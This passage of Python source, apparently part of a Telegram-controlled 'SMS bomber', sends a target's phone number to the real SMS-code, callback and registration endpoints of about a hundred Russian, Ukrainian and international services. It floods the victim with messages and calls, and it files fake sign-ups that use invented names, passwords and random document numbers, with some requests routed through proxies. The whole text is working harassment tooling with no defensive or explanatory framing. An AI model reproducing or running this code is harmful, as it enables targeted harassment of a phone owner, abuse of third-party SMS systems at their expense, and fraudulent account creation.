            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] qlean отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print('[@'+str(bot_username)+'] [+] SMSgorod отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print('[@'+str(bot_username)+'] [+] Tinder отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[@'+str(bot_username)+'] [+] Twitch отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[@'+str(bot_username)+'] [+] CabWiFi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print('[@'+str(bot_username)+'] [+] wowworks отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Eda.Yandex отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SMS отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Delivery отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},headers=standar_headers,proxies=proxies)
            print('[@'+str(bot_username)+'] [+]ritm отправлено')
        except:
            pass
        
        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Inv отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sber отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[@'+str(bot_username)+'] [+] RuTaxi sent!')
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
            print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
            print('[@'+str(bot_username)+'] [+] Comfy отправлено!')
        except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print('[@'+str(bot_username)+'] [+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print('[@'+str(bot_username)+'] [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print('[@'+str(bot_username)+'] [+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [-] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
            print('[@'+str(bot_username)+'] [-] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-]не отправлено!')

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] отправлено!')

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Максим",
                "surname": "Летовал",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print('[@'+str(bot_username)+'] [+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print('[@'+str(bot_username)+'] [+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print('[@'+str(bot_username)+'] [+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print('[@'+str(bot_username)+'] [+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print('[@'+str(bot_username)+'] [+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print('[@'+str(bot_username)+'] [+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print('[@'+str(bot_username)+'] [+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print('[@'+str(bot_username)+'] [+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print('[@'+str(bot_username)+'] [+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print('[@'+str(bot_username)+'] [+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print('[@'+str(bot_username)+'] [+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print('[@'+str(bot_username)+'] [+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print('[@'+str(bot_username)+'] [+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print('[@'+str(bot_username)+'] [+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print('[@'+str(bot_username)+'] [+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
            print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print('[@'+str(bot_username)+'] [+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print('[@'+str(bot_username)+'] [+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print('[@'+str(bot_username)+'] [+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print('[@'+str(bot_username)+'] [+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print('[@'+str(bot_username)+'] [+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinder sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print('[@'+str(bot_username)+'] [+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print('[@'+str(bot_username)+'] [+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print('[@'+str(bot_username)+'] [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] MTS sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] MyGames sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[@'+str(bot_username)+'] [+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print('[@'+str(bot_username)+'] [+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print('[@'+str(bot_username)+'] [+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print('[@'+str(bot_username)+'] [+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print('[@'+str(bot_username)+'] [+] Av отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[@'+str(bot_username)+'] [+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print('[@'+str(bot_username)+'] [+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print('[@'+str(bot_username)+'] [+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print('[@'+str(bot_username)+'] [+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print('[@'+str(bot_username)+'] [+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print('[@'+str(bot_username)+'] [+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[@'+str(bot_username)+'] [+] Online.ua отправлено!')
            time.sleep(0.1)
